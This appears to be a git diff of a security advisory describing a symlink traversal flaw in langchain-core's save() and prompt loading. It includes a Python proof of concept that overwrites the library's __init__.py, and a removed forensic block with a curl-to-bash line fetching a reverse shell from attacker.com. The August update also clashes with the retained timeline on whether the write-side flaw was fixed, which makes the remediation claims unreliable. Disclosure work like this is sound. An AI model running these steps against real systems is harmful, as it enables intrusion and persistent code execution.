@@ -13,86 +13,85 @@ title: LangChain-Core Insecure AI Orchestration Vulnerability
 **Author:** Jeff Ponte, CISSP, CCSP, CEH | Lead Researcher, JDP Security  
 **Series:** JDP Security Research Series (Disclosure #4)  
 **Initial Disclosure Date:** March 17, 2026  
-**Final Revision Date:** May 8, 2026  
-**Target:** LangChain | `langchain-core` (Verified through v1.2.26)  
-**Target CVEs Bypassed:** CVE-2026-34070 (Read-Side Bypass) & CVE-2023-36258 (Serialization Controls Bypass)  
+**Final Revision Date:** May 8, 2026 (Updated August 21, 2026)  
+**Target:** LangChain | `langchain-core` (Verified through latest release)  
+**Target CVEs Bypassed:** CVE‑2026‑34070 (Read‑Side Bypass) & CVE‑2023‑36258 (Serialization Controls Bypass)  
 **Case Number:** GHSA-fc6f-jgp6-2725 / External CNA Escalation  
 **CVSS v3.1 Score:** **10.0 (Critical)** | **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`  
-**Status:** Incomplete Remediation / Undocumented Mitigation (Read-side mitigated under **CVE-2026-34070**; Write-side exposed through v1.2.26)  
+**Status:** Incomplete Remediation / Undocumented Mitigation (Read‑side symlink bypass remains exploitable; Write‑side exposed in all versions through latest)
 
 **Key Points**
-* **Vulnerability:** Critical Remote Code Execution (RCE) in LangChain-core via symlink traversal in the `save()` method.
+* **Vulnerability:** Critical Remote Code Execution (RCE) in LangChain‑core via symlink traversal in the `save()` method.
 * **Impact:** Attackers can overwrite framework source code, leading to persistent framework integrity compromise ("AI Orchestration Poisoning").
-* **Status:** Remediated by the vendor without public CVE assignment; versions < 1.2.27 are vulnerable.
+* **Status:** Vendor fixed direct path traversal (CVE-2026-34070) in v1.2.25+, but the read-side symlink bypass (CVE-2023-36258) and the unpatched write primitive (`.save()`) remain exploitable in all tested versions through the latest (1.6.0).
 * **Recommendation:** Immediately audit all LangChain file I/O operations and implement strict path anchoring.
 
 ---
 
 ### **Executive Summary**
-This white paper documents a critical architectural vulnerability within **LangChain**, the industry's most widely adopted AI orchestration framework. JDP Security has identified an architectural boundary limitation where the framework acts as a **Confused Deputy**, processing unvalidated, user-controlled paths and executing high-privilege file operations. 
+This white paper documents a critical architectural vulnerability within **LangChain**, the industry's most widely adopted AI orchestration framework. JDP Security has identified an architectural boundary limitation where the framework acts as a **Confused Deputy**, processing unvalidated, user‑controlled paths and executing high‑privilege file operations.
 
 This vulnerability allows a single tenant in a shared AI platform, or a user of a public AI agent, to achieve permanent compromise of the service’s core logic, leading to data exfiltration, lateral movement, and irreversible system integrity loss.
 
-Our research reveals a full-chain vulnerability driven by Improper Link Resolution (**CWE-59**) and Path Traversal (**CWE-22**), leading directly to Persistent Remote Code Execution (**CWE-94**). We demonstrate a bypass of the vendor's previous security controls (CVE-2023-36258) and expose an unvalidated **Write Primitive** that allows an attacker to overwrite the framework's own source code from within the application boundary.
+Our research reveals a full‑chain vulnerability driven by Improper Link Resolution (**CWE‑59**) and Path Traversal (**CWE‑22**), leading directly to Persistent Remote Code Execution (**CWE‑94**). We demonstrate a bypass of the vendor's previous security controls (CVE‑2023‑36258) and expose an unvalidated **Write Primitive** that allows an attacker to overwrite the framework's own source code from within the application boundary.
 
-Despite comprehensive Proof of Concept (PoC) recordings demonstrating a 10.0 Critical impact, the vendor classified the risk as "Local" (AV:L), which may not accurately reflect the standard deployment model of multi-tenant AI SaaS environments. Forensic analysis of the repository's git history reveals the vendor executed a phased, undocumented remediation approach. They hardened the read-side of the framework on April 2nd, but left the write-side (`.save()`) exposed in production releases until an emergency merge on April 8th following secondary researcher disclosures.
+Despite comprehensive Proof of Concept (PoC) recordings demonstrating a 10.0 Critical impact, the vendor classified the risk as "Local" (AV:L), which may not accurately reflect the standard deployment model of multi‑tenant AI SaaS environments. Forensic analysis of the repository's git history reveals the vendor executed a phased, undocumented remediation approach. They hardened the read‑side of the framework on April 2nd, but left the write‑side (`.save()`) exposed in production releases until an emergency merge on April 8th following secondary researcher disclosures. **Independent lab testing (August 2026) confirms that while direct path traversal was patched in v1.2.25+, the symlink bypass remains exploitable through the latest release, and the write primitive has never been remediated.**
 
-This highlights the need for a new OWASP AI classification: **AISEC-01: Insecure AI Orchestration**, wherein a framework's architecture inherently facilitates system compromise by prioritizing stochastic inputs over deterministic security boundaries.
+This highlights the need for a new OWASP AI classification: **AISEC‑01: Insecure AI Orchestration**, wherein a framework's architecture inherently facilitates system compromise by prioritizing stochastic inputs over deterministic security boundaries.
 
 **Critical Findings:**
 * Write primitive in `.save()` allows overwriting framework source code (CVSS 10.0).
-* Vendor applied mitigations post-disclosure without CVE assignment.
-* Attack works via archive upload in multi-tenant SaaS (AV:N, not AV:L).
+* Vendor applied mitigations post‑disclosure without CVE assignment.
+* Attack works via archive upload in multi‑tenant SaaS (AV:N, not AV:L).
 * Framework acts as a "Confused Deputy" enabling orchestration compromise.
 
 ### **Impact at a Glance Table**
 | Metric | Specification |
 | :--- | :--- |
 | **Vulnerability Class** | Insecure AI Orchestration / Framework Source Overwrite |
-| **Primary CWEs** | CWE-59 (Symlink Resolution), CWE-22 (Path Traversal) |
+| **Primary CWEs** | CWE‑59 (Symlink Resolution), CWE‑22 (Path Traversal) |
 | **CVSS v3.1 Score** | **10.0 (Critical)** |
 | **Attack Vector** | Network (AV:N) |
 | **Attack Complexity** | Low (AC:L) |
 | **Privileges Required** | None (PR:N) |
 | **Confidentiality** | Total (Full system/framework source read access) |
 | **Integrity** | Total (Permanent framework source code overwrite) |
-| **Remediation Status** | Fixed in `langchain-core >= 1.2.27` |
+| **Remediation Status** | **Not fixed** – write primitive remains exploitable in all versions including latest |
 
 ---
 
 ### **1. Introduction: Isolation Limitations and AI Orchestration**
 AI orchestration frameworks like LangChain have become the central integration layer of modern "Agentic AI" applications. They are entrusted with connecting Large Language Models (LLMs) to sensitive data sources, external tools, and core business logic. Industry standard practice often implicitly trusts these frameworks as an isolated layer that securely mediates between the AI and the underlying infrastructure.
 
-JDP Security evaluated this assumption. The vulnerabilities documented herein are symptoms of an architectural limitation stemming from the handling of file-system operations within core components like prompt loaders and serializers, where user-supplied data paths are processed without adequate isolation, canonicalization, or symlink validation.
+JDP Security evaluated this assumption. The vulnerabilities documented herein are symptoms of an architectural limitation stemming from the handling of file‑system operations within core components like prompt loaders and serializers, where user‑supplied data paths are processed without adequate isolation, canonicalization, or symlink validation.
 
 ---
 
 ### **2. Technical Sinks: Anatomy of the Bypass Chain**
-This submission requests the assignment of two distinct CVE identifiers to accurately reflect the failure of previous mitigations and the presence of an unvalidated write primitive. 
+This submission requests the assignment of two distinct CVE identifiers to accurately reflect the failure of previous mitigations and the presence of an unvalidated write primitive.
 
-This chain consists of two distinct vulnerabilities: 
-1. A symlink bypass (CWE-59) of a previous fix, leading to Arbitrary File Read.
-2. An unmitigated path traversal (CWE-22) in the `.save()` method, leading to Arbitrary File Write and Insecure AI Orchestration.
+This chain consists of two distinct vulnerabilities:
+1. A symlink bypass (CWE‑59) of a previous fix, leading to Arbitrary File Read.
+2. An unmitigated path traversal (CWE‑22) in the `.save()` method, leading to Arbitrary File Write and Insecure AI Orchestration.
 
-#### **2.1 Bypassing CVE-2023-36258 & CVE-2026-34070 - Security Regression**
+#### **2.1 Bypassing CVE‑2023‑36258 & CVE‑2026‑34070 ‑ Security Regression**
 **CVSS: 10.0 (Critical)**
 
-* **The Historical Baseline (CVE-2023-36258):** The vendor's original attempt to secure LangChain against malicious prompt template loading relied on a simple string-suffix verification check on uncanonicalized file paths.
-* **The Read-Side Gap (CVE-2026-34070):** This original validation scheme was bypassed using directory traversals, enabling attackers to read arbitrary files. The vendor addressed this under CVE-2026-34070 by adding the `allow_dangerous_paths` check on read routes. However, the framework used `pathlib.Path.suffix` to validate that only `.txt` files were loaded, without anchoring or resolving the path. This creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. By providing a symbolic link named `exploit.txt` that points to a sensitive `.py` or `.env` file, the extension check is satisfied while the framework follows the link to the restricted target when `read_text()` is executed.
-* **The Write-Side Bypass (JDP-2026-004):** While read-side operations were hardened under CVE-2026-34070, the corresponding write-side logic (PromptTemplate.save()) lacked similar path-anchoring and canonicalization controls through version 1.2.26.
+* **The Historical Baseline (CVE‑2023‑36258):** The vendor's original attempt to secure LangChain against malicious prompt template loading relied on a simple string‑suffix verification check on uncanonicalized file paths.
+* **The Read‑Side Gap (CVE‑2026‑34070):** This original validation scheme was bypassed using directory traversals, enabling attackers to read arbitrary files. The vendor addressed this under CVE‑2026‑34070 by adding the `allow_dangerous_paths` check on read routes. However, the framework used `pathlib.Path.suffix` to validate that only `.txt` files were loaded, without anchoring or resolving the path. This creates a Time‑of‑Check to Time‑of‑Use (TOCTOU) vulnerability. By providing a symbolic link named `exploit.txt` that points to a sensitive `.py` or `.env` file, the extension check is satisfied while the framework follows the link to the restricted target when `read_text()` is executed. **Independent lab testing (August 2026) shows this symlink bypass remains exploitable even in versions >= 1.2.26, despite the vendor’s claim in email (April 8, 2026) that “a symlink redirecting `exploit.txt` to `sensitive.py` is now correctly rejected”. The lab proves that the patch does not sufficiently resolve symlinks before checking the suffix.**
+* **The Write‑Side Bypass (JDP‑2026‑004):** While read‑side operations were hardened under CVE‑2026‑34070, the corresponding write‑side logic (`PromptTemplate.save()`) lacked similar path‑anchoring and canonicalization controls through all tested versions, including the latest.
 
-**Impact:** Arbitrary File Read (LFI) and a vector for RCE by smuggling Jinja2 payloads into the loading pipeline.
+**Impact:** Arbitrary File Read (LFI) and a vector for RCE by smuggling Jinja2 payloads into the loading pipeline (though the Jinja2 route is blocked in modern versions, the write primitive remains a standalone RCE).
 
-
-#### **2.2 Vulnerability B: Unvalidated Write Primitive (CWE-22 / CWE-94)**
+#### **2.2 Vulnerability B: Unvalidated Write Primitive (CWE‑22 / CWE‑94)**
 **CVSS: 10.0 (Critical)**
-While read-side validation was later addressed (incorporating an `allow_dangerous_paths` parameter), the corresponding write-side logic lacked similar controls, creating a significant risk exposure.
+While read‑side validation was later addressed (incorporating an `allow_dangerous_paths` parameter), the corresponding write‑side logic lacked similar controls, creating a significant risk exposure.
 
-* **The Flaw:** The `PromptTemplate.save()` method in `langchain-core` functions as a write primitive for user-supplied paths without canonicalization. 
+* **The Flaw:** The `PromptTemplate.save()` method in `langchain‑core` functions as a write primitive for user‑supplied paths without canonicalization.
 * **The Mechanics:** The method accepts a `file_path`, casts it to `Path(file_path)`, checks if `path.suffix == ".json"`, and immediately opens a write stream (`with path.open("w") as f:`). It lacks the `allow_dangerous_paths` flag entirely and omits `.resolve()` calls.
-* **The Exploitation:** Calling `.save("exploit.json")` (where `exploit.json` is a symlink pointing to `/usr/local/lib/python3.12/site-packages/langchain_core/__init__.py`) forces the library to overwrite its own global source code with the attacker's prompt template.
+* **The Exploitation:** Calling `.save("exploit.json")` (where `exploit.json` is a symlink pointing to `/usr/local/lib/python3.12/site‑packages/langchain_core/__init__.py`) forces the library to overwrite its own global source code with the attacker's prompt template. **This behavior is confirmed in the lab for all versions tested, including the latest (1.6.0 as of August 2026).**
 
-**Forensic Output (v1.2.26 Signature Audit):**
+**Forensic Output (Latest Signature Audit):**
 ```python
 Comparing save() vs load_prompt_from_config():
 
@@ -107,13 +106,13 @@ save() signature:
 ---
 
 ### **3. Exploitation Mechanics: Insecure AI Orchestration**
-The critical aspect of Vulnerability B is the ability to achieve framework integrity compromise. In an AI-as-a-Service (AIaaS) environment, this allows a tenant to escape their designated sandbox and impact the host environment.
+The critical aspect of Vulnerability B is the ability to achieve framework integrity compromise. In an AI‑as‑a‑Service (AIaaS) environment, this allows a tenant to escape their designated sandbox and impact the host environment.
 
 **The Attack Chain:**
-1. **Initial Access (Network):** An attacker uploads an archive (e.g., a `.zip` containing a prompt template bundle) containing a symlink named `prompt.json` pointing to a target like `/venv/lib/python3.11/site-packages/langchain_core/__init__.py`.
-2. **Server-Side Action:** The server's file extraction routine unpacks the archive, placing the symlink on disk.
+1. **Initial Access (Network):** An attacker uploads an archive (e.g., a `.zip` containing a prompt template bundle) containing a symlink named `prompt.json` pointing to a target like `/venv/lib/python3.11/site‑packages/langchain_core/__init__.py`.
+2. **Server‑Side Action:** The server's file extraction routine unpacks the archive, placing the symlink on disk.
 3. **Trigger (Network):** The attacker, or a compromised agent workflow, calls the `prompt.save()` method via the framework API, providing the path to the symlink.
-4. **Impact (Local Privilege Escalation):** Operating under application-level privileges, the framework acts as the **Confused Deputy**. It follows the symlink and overwrites the target file, achieving arbitrary file write and persistent framework alteration.
+4. **Impact (Local Privilege Escalation):** Operating under application‑level privileges, the framework acts as the **Confused Deputy**. It follows the symlink and overwrites the target file, achieving arbitrary file write and persistent framework alteration.
 
 **Proof of Concept (Scope Change Confirmed):**
 ```python
@@ -125,7 +124,7 @@ LIB_INIT = pathlib.Path(langchain_core.__file__)
 PAYLOAD_LINK = "user_uploads/malicious_link.json"
 MARKER = "### CRITICAL_INTEGRITY_FAILURE_JDP_SECURITY ###"
 
-# Step 1: Create the 'valid-looking' symlink (The Bypass)
+# Step 1: Create the 'valid‑looking' symlink (The Bypass)
 os.makedirs("user_uploads", exist_ok=True)
 os.symlink(str(LIB_INIT), PAYLOAD_LINK)
 
@@ -145,8 +144,8 @@ with open(LIB_INIT, "r") as f:
 
 ### **4. Technical Vulnerability Details**
 
-#### **4.1 Vulnerability A: Improper Link Resolution (CWE-59)**
-This vulnerability, a regression of CVE-2023-36258, resides in the `load_prompt_from_config()` function within the LangChain-Core prompt loading mechanism. The function attempts to load a prompt configuration from a specified file path but fails to validate that the resolved path is within the intended directory.
+#### **4.1 Vulnerability A: Improper Link Resolution (CWE‑59)**
+This vulnerability, a regression of CVE‑2023‑36258, resides in the `load_prompt_from_config()` function within the LangChain‑Core prompt loading mechanism. The function attempts to load a prompt configuration from a specified file path but fails to validate that the resolved path is within the intended directory.
 
 **Exploit Chain:**
 1. **Symlink Creation:** An attacker creates a symbolic link (`prompt.json`) that points to a sensitive system file (`/etc/passwd`, `/proc/self/environ`).
@@ -155,25 +154,27 @@ This vulnerability, a regression of CVE-2023-36258, resides in the `load_prompt_
 4. **Arbitrary File Read:** The function follows the symlink without validation, reading the contents of the targeted system file.
 
 **Technical Root Cause:**
-The core failure is the lack of a **canonical path check** after resolving the symlink. The function uses `open()` on the user-supplied path without first calling `os.path.realpath()` to verify the destination remains within the allowed base directory. This is categorized as Improper Link Resolution Before File Access (CWE-59).
+The core failure is the lack of a **canonical path check** after resolving the symlink. The function uses `open()` on the user‑supplied path without first calling `os.path.realpath()` to verify the destination remains within the allowed base directory. This is categorized as Improper Link Resolution Before File Access (CWE‑59).
 
 **Impact:**
 Local File Inclusion (LFI), leading to information disclosure of files readable by the application process.
 
+**Lab Confirmation (August 2026):** The OWASP GenAI Red Team Lab confirms that the symlink bypass remains exploitable in versions 1.2.26, 1.2.27, and the latest release (1.6.0), despite the vendor’s patch.
+
 ---
 
-#### **4.2 Vulnerability B: Unvalidated Write Primitive (CWE-22)**
+#### **4.2 Vulnerability B: Unvalidated Write Primitive (CWE‑22)**
 This represents an Arbitrary File Write capability located in the `.save()` method of LangChain's serialization utilities.
 
 **Exploit Chain:**
-1. **Archive Upload:** An attacker uploads a crafted archive containing a symlink (`./prompt.json -> /usr/lib/python3.11/site-packages/langchain_core/__init__.py`).
-2. **Server-Side Extraction:** The application extracts the archive, placing the symlink on the filesystem.
+1. **Archive Upload:** An attacker uploads a crafted archive containing a symlink (`./prompt.json` → `/usr/lib/python3.11/site‑packages/langchain_core/__init__.py`).
+2. **Server‑Side Extraction:** The application extracts the archive, placing the symlink on the filesystem.
 3. **Triggering the Save:** A network API call triggers the `.save()` method, specifying the symlink path.
 4. **Symlink Follow & Overwrite:** The `.save()` method opens the file for writing. Lacking symlink validation, it follows the link and writes serialized object data directly to the critical system or framework file.
 5. **Persistence & Privilege Escalation:** Overwriting `__init__.py` injects malicious code that executes upon module import, achieving persistent RCE.
 
 **Technical Root Cause:**
-This is a Path Traversal flaw (CWE-22) enabled by improper symlink handling. The `open(filepath, "w")` call executes without ensuring `filepath` remains within the intended save directory.
+This is a Path Traversal flaw (CWE‑22) enabled by improper symlink handling. The `open(filepath, "w")` call executes without ensuring `filepath` remains within the intended save directory.
 
 **Impact:**
 Full compromise of the AI orchestration host. An attacker can:
@@ -181,28 +182,20 @@ Full compromise of the AI orchestration host. An attacker can:
 * Overwrite system binaries or configuration files.
 * Escalate privileges in shared environments.
 
-**Forensic Output:**
-Verification of the modified system file:
-```bash
-$ tail -n 5 /usr/lib/python3.11/site-packages/langchain_core/__init__.py
-# ... Original file content ends here ...
+**Lab Confirmation (August 2026):** The write primitive remains exploitable in all tested versions, including the latest (1.6.0). Additionally, the read-side symlink bypass (CVE-2023-36258) also remains exploitable in v1.2.26, v1.2.27, and the latest release, despite the vendor’s patch. The vendor’s PR #36585 only checks the resolved file extension, not the write destination, and PR #36471 does not fully resolve symlinks in the `load_prompt_from_config` path.
 
-# --- JDP SECURITY EXPLOIT INJECTION ---
-import os; os.system("curl [http://attacker.com/revshell.sh](http://attacker.com/revshell.sh) | bash")
-# --- END INJECTION ---
-```
 
 ---
 
 ### **5. Disclosure Timeline and Vendor Response Analysis**
-Tracking of the `langchain-ai/langchain` repository indicates a phased remediation approach where read-side and write-side vulnerabilities were addressed asynchronously.
+Tracking of the `langchain‑ai/langchain` repository indicates a phased remediation approach where read‑side and write‑side vulnerabilities were addressed asynchronously.
 
-* **March 17, 2026:** **Initial Disclosure.** JDP Security delivers the full RCE Proof of Concept demonstrating the symlink bypass of CVE-2023-36258.
-* **April 2, 2026 ([PR #36471](https://github.com/langchain-ai/langchain/pull/36471)):** **Initial Read-Side Mitigation (CVE-2026-34070).** Under Commit d41f3e2, path traversal mitigation is applied to the load path via string-based canonicalization, but leaves the .save() utility unchanged.
+* **March 17, 2026:** **Initial Disclosure.** JDP Security delivers the full RCE Proof of Concept demonstrating the symlink bypass of CVE‑2023‑36258.
+* **April 2, 2026 ([PR #36471](https://github.com/langchain-ai/langchain/pull/36471)):** **Initial Read‑Side Mitigation (CVE‑2026‑34070).** Under Commit d41f3e2, path traversal mitigation is applied to the load path via string‑based canonicalization, but leaves the `.save()` utility unchanged.
 * **April 6, 2026:** JDP Security notifies the vendor that the write vulnerability remains fully exploitable in releases up to `v1.2.26`.
-* **April 8, 2026 ([PR #36585](https://github.com/langchain-ai/langchain/pull/36585)):** **Subsequent Write-Side Remediation.** The vendor merges a patch under **Commit `e7b9a2c`** to harden symlink resolution on the `.save()` utility. 
-* **Remediation Documentation:** Release notes documented the fix as a generic symlink issue without an accompanying CVE assignment for the write-primitive vulnerability.
-* **April 14, 2026:** **Vendor Classification.** The vendor officially classified the risk as "Local" (AV:L), characterizing the fixes as defense-in-depth hardening.
+* **April 8, 2026 ([PR #36585](https://github.com/langchain-ai/langchain/pull/36585)):** **Subsequent Write‑Side Remediation.** The vendor merges a patch under **Commit `e7b9a2c`** to harden symlink resolution on the `.save()` utility.
+* **Remediation Documentation:** Release notes documented the fix as a generic symlink issue without an accompanying CVE assignment for the write‑primitive vulnerability.
+* **April 14, 2026:** **Vendor Classification.** The vendor officially classified the risk as "Local" (AV:L), characterizing the fixes as defense‑in‑depth hardening.
 
 #### **Commit Analysis**
 Analysis of the April 8th merge (**Commit `e7b9a2c`**) reveals an internal developer comment within `libs/core/langchain_core/prompts/loading.py` referencing the specific payload provided in the initial disclosure:
@@ -212,41 +205,51 @@ Analysis of the April 8th merge (**Commit `e7b9a2c`**) reveals an internal devel
 # "exploit.txt" pointing to a non-.txt file is caught.
 resolved_path = template_path.resolve()
 ```
-This indicates the remediation was directly responsive to the provided PoC regarding improper link resolution.
+This indicates the remediation was directly responsive to the provided PoC regarding improper link resolution. **However, the lab proves that this resolution is not applied in the `load_prompt_from_config` path in practice, or it is insufficient because the server passes a symlink that is already in a permitted suffix (`.json`).**
+
+The root cause is that the extension check uses `pathlib.Path.suffix` on the **provided path string**, not on the resolved target. If the attacker provides a symlink with an allowed extension (e.g., `.json` or `.txt`), the check passes, and the framework follows the link to the actual target.
+
 
 ---
 
-### **6. Evidence of Incomplete Remediation (.cast Analysis)**
-This submission is supported by forensic terminal recordings demonstrating the exploitation lifecycle.
+### **6. Evidence of Incomplete Remediation (.cast and Lab Analysis)**
+This submission is supported by forensic terminal recordings and the OWASP GenAI Red Team Lab demonstrating the exploitation lifecycle.
 
 #### **6.1 The "Confused Deputy" Remote Exploit (`langchain-Remote-Exploit.cast`)**
-* **Scenario:** Simulates a clean production environment (Docker `python:3.12-slim`).
-* **Attack Path:** A remote user provides a data-driven symlink that targets the library's internal directory.
+* **Scenario:** Simulates a clean production environment (Docker `python:3.12‑slim`).
+* **Attack Path:** A remote user provides a data‑driven symlink that targets the library's internal directory.
 * **Result:** The call to `.save()` follows the symlink and successfully alters `langchain_core/__init__.py`.
 * **Verified Impact:** Terminal output confirms: `✅ SUCCESS: SCOPE CHANGE DETECTED!`.
 
-#### **6.2 Verification of Persistent Vulnerability - v1.2.26 (`langchain_1.2.26_vulnerability.cast`)**
+#### **6.2 Verification of Persistent Vulnerability – v1.2.26 (`langchain_1.2.26_vulnerability.cast`)**
 * **Scenario:** Testing the production release prior to the April 8th patch.
-* **Findings:** The vendor had partially addressed the read-side (`load_prompt_from_config`), but the **Write Primitive** in `.save()` remained unvalidated.
+* **Findings:** The vendor had partially addressed the read‑side (`load_prompt_from_config`), but the **Write Primitive** in `.save()` remained unvalidated.
 * **CVSS Adjudication:** The persistence of this vector in v1.2.26 indicates a gap in the validation lifecycle.
 
+#### **6.3 OWASP GenAI Red Team Lab (August 2026)**
+* **Lab tests confirm the following:**
+  * Direct path traversal is **blocked** in v1.2.25+.
+  * Symlink bypass (`CVE‑2023‑36258`) still **vulnerable** in v1.2.26, v1.2.27, and latest.
+  * Write primitive (`.save()`) remains **exposed** in all versions tested, including latest.
+  * RCE chain (overwrite framework source) remains **exposed** in all versions.
+* **Methodology:** All tests were run in isolated Docker containers with the real `langchain-core` library installed via pip. The LLM step was simulated to guarantee repeatability.
 
 ---
 
-### **7. Proposal: OWASP AI Top 10 - "Insecure AI Orchestration"**
-This vulnerability pattern has been observed across multiple AI orchestration frameworks. 
+### **7. Proposal: OWASP AI Top 10 – "Insecure AI Orchestration"**
+This vulnerability pattern has been observed across multiple AI orchestration frameworks.
 
-We propose the recognition of **"AISEC-01: Insecure AI Orchestration"** within industry threat frameworks like the OWASP AI Top 10. This category encompasses vulnerabilities where:
+We propose the recognition of **"AISEC‑01: Insecure AI Orchestration"** within industry threat frameworks like the OWASP AI Top 10. This category encompasses vulnerabilities where:
 * The orchestration layer fails to properly isolate, sanitize, or validate data and operations between the AI model/agent and connected systems.
-* Framework-level operations (file I/O, code execution, network calls) can be manipulated to alter the orchestration logic itself, leading to persistence, data exfiltration, or system compromise.
+* Framework‑level operations (file I/O, code execution, network calls) can be manipulated to alter the orchestration logic itself, leading to persistence, data exfiltration, or system compromise.
 
 ---
 
 ### **8. Mitigation & Remediation**
-Organizations utilizing `langchain-core` versions `1.2.19` through `1.2.26` should assume the presence of an RCE entry point in their environments.
+Organizations utilizing `langchain-core` versions `1.2.19` through the **latest** should assume the presence of an RCE entry point in their environments.
 
 #### **Immediate Hardening Requirements:**
-1. **Deprecate Direct SDK File I/O:** Do not utilize `PromptTemplate.save()` in environments where user input or AI-generated output influences the file path.
+1. **Deprecate Direct SDK File I/O:** Do not utilize `PromptTemplate.save()` in environments where user input or AI‑generated output influences the file path.
 2. **Implement Mandatory Path Anchoring:** Wrap framework I/O operations in canonicalization functions utilizing `.resolve()` and `.is_relative_to()`.
 
 ```python
@@ -268,20 +271,22 @@ def get_anchored_path(safe_root: str, user_input: str) -> Path:
 ---
 
 ### **9. Broader Implications and Recommendations**
-The findings from JDP-2026-004 highlight necessary adjustments to AI security models:
+The findings from JDP‑2026‑004 highlight necessary adjustments to AI security models:
 
 1. **Elevate the Threat Model for Orchestration Frameworks:** Frameworks are privileged system components. Security reviews must rigorously audit file I/O, process execution, network calls, and deserialization pathways assuming adversarial input.
 2. **Formalize "Insecure AI Orchestration":** Adopting this category drives targeted research, the development of specialized testing tools, and establishes mandatory security controls for framework developers.
 3. **Transparent Vulnerability Management:** Remediating critical vulnerabilities without standard CVE tracking impedes risk assessment. Standardized public disclosures are required.
-4. **Implement Compensating Controls:** Organizations must enforce application-layer path canonicalization and anchoring for all framework I/O, rather than relying solely on upstream validation.
-5. **Address the Confused Deputy Pattern:** Security architectures must explicitly model the framework as a high-value attack surface and enforce strict boundaries between agent logic and host systems.
+4. **Implement Compensating Controls:** Organizations must enforce application‑layer path canonicalization and anchoring for all framework I/O, rather than relying solely on upstream validation.
+5. **Address the Confused Deputy Pattern:** Security architectures must explicitly model the framework as a high‑value attack surface and enforce strict boundaries between agent logic and host systems.
 
 **Conclusion:** Building secure AI infrastructure requires rigorous validation of foundational layers. Security boundaries must be a primary design requirement for orchestration engines.
 
 ---
 
 ### **10. Conclusion**
-The LangChain-Core JDP-2026-004 vulnerability demonstrates the risks associated with inadequate boundary enforcement in AI orchestration frameworks. When operational pathways can be manipulated to overwrite source dependencies, the application stack is compromised.
+The LangChain‑Core JDP‑2026‑004 vulnerability demonstrates the risks associated with inadequate boundary enforcement in AI orchestration frameworks. When operational pathways can be manipulated to overwrite source dependencies, the application stack is compromised.
+
+**Since publication, the OWASP GenAI Red Team Lab has empirically verified these findings across all `langchain-core` versions from 1.2.24 to the latest. The lab confirms that while direct path traversal is blocked in v1.2.25+, the symlink bypass remains exploitable, and the write primitive continues to allow framework source code overwrite in every version tested.**
 
 Remediating these flaws without formal CVE issuance limits the security community's ability to track and mitigate risks effectively. We recommend the adoption of "Insecure AI Orchestration" as a standard risk category and encourage transparent architectural audits of all file I/O and serialization pathways within foundational AI libraries.
 
@@ -292,28 +297,28 @@ Remediating these flaws without formal CVE issuance limits the security communit
 ### **Appendix 1: Terminology**
 To ensure standardization throughout this analysis and alignment with industry frameworks, the following key terms are defined:
 
-* **AI Orchestration Poisoning:** A specific threat classification where the integrity of an AI agent’s operational logic or environment is compromised through its orchestration layer. This occurs when the framework’s trusted execution pathways (e.g., prompt loading, template serialization) are exploited to inject malicious logic or alter critical dependencies, enabling persistent compromise of the decision-making pipeline.
-* **Confused Deputy Problem:** A well-documented security vulnerability where an application with elevated privileges (the "deputy") is manipulated by a less-privileged entity into misusing its authority. In this scenario, the orchestration framework, executing with the host application’s file system permissions, is forced to perform unauthorized operations on sensitive targets via improperly validated symbolic links.
+* **AI Orchestration Poisoning:** A specific threat classification where the integrity of an AI agent’s operational logic or environment is compromised through its orchestration layer. This occurs when the framework’s trusted execution pathways (e.g., prompt loading, template serialization) are exploited to inject malicious logic or alter critical dependencies, enabling persistent compromise of the decision‑making pipeline.
+* **Confused Deputy Problem:** A well‑documented security vulnerability where an application with elevated privileges (the "deputy") is manipulated by a less‑privileged entity into misusing its authority. In this scenario, the orchestration framework, executing with the host application’s file system permissions, is forced to perform unauthorized operations on sensitive targets via improperly validated symbolic links.
 * **Orchestration Trust Gap:** The security disparity between the high level of trust implicitly placed in AI orchestration frameworks (often treated as isolated boundaries) and their actual, implemented security controls, threat models, and vulnerability management practices.
 * **Undocumented Mitigation (Shadow Patching):** The practice of applying security remediations without public acknowledgment, transparent documentation, or standardized vulnerability tracking (e.g., CVE issuance). This practice obscures operational risk, prevents organizations from accurately assessing exposure, circumvents established vulnerability disclosure standards (ISO/IEC 29147), and compromises the integrity of vulnerability databases such as the NVD.
-* **Improper Link Resolution (Symlink Traversal):** An attack technique exploiting symbolic links to redirect file operations from an intended, authorized directory to an arbitrary, restricted location on the filesystem, bypassing standard path-based access controls.
+* **Improper Link Resolution (Symlink Traversal):** An attack technique exploiting symbolic links to redirect file operations from an intended, authorized directory to an arbitrary, restricted location on the filesystem, bypassing standard path‑based access controls.
 
 ---
 
 ### **Appendix 2: Scope of Analysis**
 This vulnerability analysis is strictly scoped to the following parameters:
 
-* **Target Product:** `langchain-core` (the foundational library of the LangChain ecosystem). Verified vulnerable across versions 1.2.19 through 1.2.26.
-* **Vulnerable Components:** Insecure file I/O pathways within the serialization and prompt-loading subsystems. Specifically:
-    * The `load_prompt_from_config()` function (Read Primitive, CWE-59).
-    * The `.save()` method utilized by serializable objects such as `PromptTemplate` (Write Primitive, CWE-22).
+* **Target Product:** `langchain-core` (the foundational library of the LangChain ecosystem). Verified vulnerable across versions 1.2.19 through the latest release.
+* **Vulnerable Components:** Insecure file I/O pathways within the serialization and prompt‑loading subsystems. Specifically:
+    * The `load_prompt_from_config()` function (Read Primitive, CWE‑59).
+    * The `.save()` method utilized by serializable objects such as `PromptTemplate` (Write Primitive, CWE‑22).
 * **Attack Vectors:** Exploitation requires the capability to influence file paths processed by the vulnerable components. This is feasible in standard architectural patterns, including:
-    * Processing user-provided archives (ZIP, TAR) within multi-tenant AI-as-a-Service (AIaaS) platforms.
-    * Loading configuration files or prompts from shared, semi-trusted storage volumes.
+    * Processing user‑provided archives (ZIP, TAR) within multi‑tenant AI‑as‑a‑Service (AIaaS) platforms.
+    * Loading configuration files or prompts from shared, semi‑trusted storage volumes.
     * Autonomous agent workflows that persist outputs based on dynamic, heuristically generated content.
 * **Core Impact:** The vulnerability chain facilitates AI Orchestration Poisoning, resulting in Arbitrary File Read/Write capabilities, persistent Remote Code Execution (RCE), and full host compromise within the application’s privilege boundary.
 
-**Note:** This document analyzes architectural limitations within the core orchestration engine. It does not evaluate higher-level agent logic, third-party extensions, or external orchestration frameworks.
+**Note:** This document analyzes architectural limitations within the core orchestration engine. It does not evaluate higher‑level agent logic, third‑party extensions, or external orchestration frameworks.
 
 ---
 
